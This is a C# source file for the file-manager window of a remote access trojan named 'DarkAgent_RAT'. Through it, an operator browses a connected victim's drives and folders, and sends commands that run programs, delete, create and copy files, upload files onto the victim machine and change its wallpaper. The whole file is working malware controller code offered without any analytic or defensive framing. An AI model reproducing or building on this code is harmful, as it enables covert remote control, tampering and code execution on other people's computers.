using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using DarkAgent_RAT.src.Events;
using DarkAgent_RAT.src.Network.DataNetwork.Packets.Send;
using DarkAgent_RAT.src.Network.DataNetwork;
using DarkAgent_RAT.src.Objects;
using System.IO;
using DarkAgent_RAT.src.Network.FileServer;
using DarkAgent_RAT.src.Network.FileServer.Packets.Send;
using DarkAgent_RAT.src.Network.FileServer.Packets;

namespace DarkAgent_RAT
{
    public partial class FileManager : DevComponents.DotNetBar.Office2007Form
    {
        string startDir = null;

        public FileManager(string startDir)
        {
            InitializeComponent();
            this.startDir = startDir;
        }

        public string RemoteIP;
        public string ClientName;
        public int ClientID;
        public string BackgroundLocation = "";
        public int IconIndex = 0;
        private List<string> CopyFileList = new List<string>();


        #region Speficic Events

        public void onGetDrives(object o, FileMgrDrivesEventArgs e)
        {
            try
            {
                if (e.RemoteIP != RemoteIP)
                    return;

                string[] str = new string[3];
                str[0] = e._FileMgrDrives.Drive;
                str[1] = e._FileMgrDrives.Caption;
                str[2] = e._FileMgrDrives.type;
                ListViewItem itm = new ListViewItem(str, 1);
                listView1.Items.Add(itm);
            }catch{}
        }

        public void onGetFolders(object o, FileMgrDirEventArgs e)
        {
            try
            {
                if (e.RemoteIP != RemoteIP || startDir == null && BackgroundLocation != e._FileMgrDir.SubDir)
                    return;

                string[] str = new string[1];
                str[0] = e._FileMgrDir.Name;
                ListViewItem itm = new ListViewItem(str, 0);
                listView2.Items.Add(itm);
            }
            catch { }
        }

        public void onGetFiles(object o, FileMgrFileEventArgs e)
        {
            try
            {
                if (e.RemoteIP != RemoteIP || startDir == null && BackgroundLocation != e._FileMgrFile.FileLocation)
                    return;

                if (e._FileMgrFile.IconHandle > 0)
                    imageList1.Images.Add(Icon.FromHandle((IntPtr)e._FileMgrFile.IconHandle));
                else
                    imageList1.Images.Add(Properties.Resources.FileMgrError);

                string[] str = new string[4];
                str[0] = e._FileMgrFile.FileName;
                str[1] = e._FileMgrFile.Extension;
                str[2] = e._FileMgrFile.Date;
                str[3] = string.Format("{0:0.00} MB ({1})", (Convert.ToInt32(e._FileMgrFile.Size) / 1024) / 1024, e._FileMgrFile.Size);
                ListViewItem itm = new ListViewItem(str, IconIndex++);
                listView3.Items.Add(itm);
            }
            catch { }
        }

        public void onClientDisconnect(object o, ClientDisconnectEventArgs e)
        {
            if (RemoteIP == e.RemoteIP)
            {
                MessageBox.Show(ClientName + " has been disconnected from the server");
                this.Close();
            }
        }

#endregion

        #region Form Events

        private void FileManager_Load(object sender, EventArgs e)
        {
            this.Text = "DarkAgent - File Manager [" + RemoteIP.Split(':')[0] + "] [" + ClientName + "]";
            FileMgrDrivesEvent.FileMgrDrives += new FileMgrDrivesHandler(onGetDrives);
            FileMgrDirEvent.FileMgrDir += new FileMgrDirHandler(onGetFolders);
            FileMgrFileEvent.FileMgrFile += new FileMgrFileHandler(onGetFiles);
            ClientDisconnectEvent.ClientDisconnect += new ClientDisconnectHandler(onClientDisconnect);

            //send packet...
            RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_FileMgrGetDrives(RatClientProcessor.Instance._clientList[ClientID]));
            if(startDir != null)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_FileMgrGetFiles(RatClientProcessor.Instance._clientList[ClientID], startDir));
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            try
            {
                BackgroundLocation = listView1.SelectedItems[0].SubItems[0].Text;
                textBox1.Text = BackgroundLocation;
                listView2.Items.Clear();
                listView3.Items.Clear();
                imageList1.Images.Clear();
                IconIndex = 0;
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_FileMgrGetFiles(RatClientProcessor.Instance._clientList[ClientID], BackgroundLocation));
            }catch{}
        }

        private void listView2_DoubleClick(object sender, EventArgs e)
        {
            try
            {
                if (!BackgroundLocation.EndsWith("\\"))
                    BackgroundLocation += "\\";

                BackgroundLocation = BackgroundLocation.Replace("\\\\", "\\");

                BackgroundLocation += listView2.SelectedItems[0].SubItems[0].Text;
                textBox1.Text = BackgroundLocation;
                listView2.Items.Clear();
                listView3.Items.Clear();
                imageList1.Images.Clear();
                IconIndex = 0;
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_FileMgrGetFiles(RatClientProcessor.Instance._clientList[ClientID], BackgroundLocation));
            }catch{ }
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!BackgroundLocation.EndsWith("\\"))
                BackgroundLocation += "\\";

            for(int i = 0; i < listView3.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_StartProcess(RatClientProcessor.Instance._clientList[ClientID], BackgroundLocation + listView3.SelectedItems[i].SubItems[0].Text, 0));
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!BackgroundLocation.EndsWith("\\"))
                BackgroundLocation += "\\";

            for (int i = 0; i < listView3.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_DeleteFile(RatClientProcessor.Instance._clientList[ClientID], BackgroundLocation + listView3.SelectedItems[i].SubItems[0].Text));

        }

        private void createFileToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (!BackgroundLocation.EndsWith("\\"))
                BackgroundLocation += "\\";

            RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_CreateFile(RatClientProcessor.Instance._clientList[ClientID], BackgroundLocation, toolStripTextBox1.Text));

        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!BackgroundLocation.EndsWith("\\"))
                BackgroundLocation += "\\";

            CopyFileList.Clear();

            for (int i = 0; i < listView3.SelectedItems.Count; i++)
                CopyFileList.Add(BackgroundLocation + listView3.SelectedItems[i].SubItems[0].Text);
        }

        private void pasteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!BackgroundLocation.EndsWith("\\"))
                BackgroundLocation += "\\";

            for (int i = 0; i < CopyFileList.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_CopyFile(RatClientProcessor.Instance._clientList[ClientID], CopyFileList[i], BackgroundLocation));

            CopyFileList.Clear();
        }

        private void contextMenuStrip1_Opening(object sender, CancelEventArgs e)
        {
            if (CopyFileList.Count == 0)
                pasteToolStripMenuItem.Enabled = false;
            else
                pasteToolStripMenuItem.Enabled = true;
        }

        private void uploadTestToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!BackgroundLocation.EndsWith("\\"))
                BackgroundLocation += "\\";

            using(OpenFileDialog dialog = new OpenFileDialog())
            {
                dialog.Multiselect = false; //temp disabled...
                dialog.Title = "Select the file(s) u want to upload";
                if(dialog.ShowDialog() == DialogResult.OK)
                {

                    FileTransfer info = new FileTransfer();
                    info.CurSize = 0;
                    info.Destination = BackgroundLocation;

                    FileInfo size = new FileInfo(dialog.FileName);
                    info.FileSize = size.Length;
                    info.Id = (short)(FileClientProcessor.Instance._clientList[ClientID]._FileTransfer.Count + 1);
                    info.type = 0;
                    info.FileName = size.Name;
                    FileClientProcessor.Instance._clientList[ClientID].SendFile(info, File.ReadAllBytes(dialog.FileName), S_FileTransferSendBegin.SendType.FileManager);
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (!BackgroundLocation.EndsWith("\\"))
                    BackgroundLocation += "\\";

                BackgroundLocation = textBox1.Text;
                BackgroundLocation = BackgroundLocation.Replace("\\\\", "\\");

                textBox1.Text = BackgroundLocation;
                listView2.Items.Clear();
                listView3.Items.Clear();
                imageList1.Images.Clear();
                IconIndex = 0;
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_FileMgrGetFiles(RatClientProcessor.Instance._clientList[ClientID], BackgroundLocation));
            }
            catch { }
        }

        private void listView3_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            switch (e.Column)
            {
                case 0:
                    listView3.ListViewItemSorter = new ColumnSorter(0);
                    listView3.Sort();
                    break;
                case 1:
                    listView3.ListViewItemSorter = new ColumnSorter(1);
                    listView3.Sort();
                    break;
                case 2:
                    listView3.ListViewItemSorter = new ColumnSorter(2);
                    listView3.Sort();
                    break;
                case 3:
                    listView3.ListViewItemSorter = new ColumnSorter(3);
                    listView3.Sort();
                    break;
            }
        }

        private void listView2_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            listView2.ListViewItemSorter = new ColumnSorter(0);
            listView2.Sort();
        }

        private void listView1_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            switch (e.Column)
            {
                case 0:
                    listView1.ListViewItemSorter = new ColumnSorter(0);
                    listView1.Sort();
                    break;
                case 1:
                    listView1.ListViewItemSorter = new ColumnSorter(1);
                    listView1.Sort();
                    break;
                case 2:
                    listView1.ListViewItemSorter = new ColumnSorter(2);
                    listView1.Sort();
                    break;
            }
        }

        #endregion

        private void setAsBackgroundToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!BackgroundLocation.EndsWith("\\"))
                BackgroundLocation += "\\";

            for(int i = 0; i < listView3.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_SetWallpaper(RatClientProcessor.Instance._clientList[ClientID], BackgroundLocation + listView3.SelectedItems[i].SubItems[0].Text));
        }

        private void FileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            FileMgrDrivesEvent.FileMgrDrives -= new FileMgrDrivesHandler(onGetDrives);
            FileMgrDirEvent.FileMgrDir -= new FileMgrDirHandler(onGetFolders);
            FileMgrFileEvent.FileMgrFile -= new FileMgrFileHandler(onGetFiles);
            ClientDisconnectEvent.ClientDisconnect -= new ClientDisconnectHandler(onClientDisconnect);
        }
    }
}